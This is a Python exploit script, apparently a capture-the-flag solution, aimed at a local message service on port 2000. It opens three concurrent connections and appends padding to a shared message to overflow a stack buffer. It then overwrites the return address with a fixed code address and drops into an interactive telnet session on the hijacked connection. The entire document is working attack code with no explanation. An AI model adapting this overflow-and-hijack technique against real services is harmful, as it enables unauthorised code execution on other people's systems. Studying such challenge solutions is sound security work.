#!/usr/bin/python3

import socket
import telnetlib
import sys
import time 


def interact_until_msg(s):
    s.send(b"append_to_message\n")
    print(s.recv(2048).decode('ASCII'))
    s.send(b"maneuvering\n")
    print(s.recv(2048).decode('ASCII'))
    name = "test"
    s.send(name.encode() + b"\n")
    print(s.recv(2048).decode('ASCII'))
    s.send(str(604).encode() + b"\n")
    print(s.recv(2048).decode('ASCII'))

# create three connections
s1 = socket.create_connection(('localhost', 2000))
s2 = socket.create_connection(('localhost', 2000))
s3 = socket.create_connection(('localhost', 2000))

# create message
s1.send(b"uplink_message\n")
print(s1.recv(2048).decode('ASCII'))
s1.send(b"maneuvering\n")
print(s1.recv(2048).decode('ASCII'))
name = "test"
s1.send(name.encode() + b"\n")
print(s1.recv(2048).decode('ASCII'))
s1.send(str(1000).encode() + b"\n")
print(s1.recv(2048).decode('ASCII'))
s1.send(b"A"*1000 + b"\n")
print(s1.recv(2048).decode('ASCII'))

time.sleep(1)
# interact
interact_until_msg(s2)
interact_until_msg(s3)

# fill half of the length to return address
s2.send(b"B"*604 + b"\n")
print(s2.recv(2048).decode('ASCII'))
time.sleep(1)

# fill other half and overwrite return address
s3.send(b"C"*596 + 0x004021ec.to_bytes(8,'little') + b"\n")
# s3.send(b"C"*604 + b"\n")
print(s3.recv(2048).decode('ASCII'))

time.sleep(1)

# read message into buffer
s1.send(b"downlink_message\n")
print(s1.recv(2048).decode('ASCII'))
s1.send(b"maneuvering\n")
print(s1.recv(2048).decode('ASCII'))
name = "test"
s1.send(name.encode() + b"\n")

t = telnetlib.Telnet()
t.sock = s1
t.interact()


s1.close()
s2.close()
s3.close()
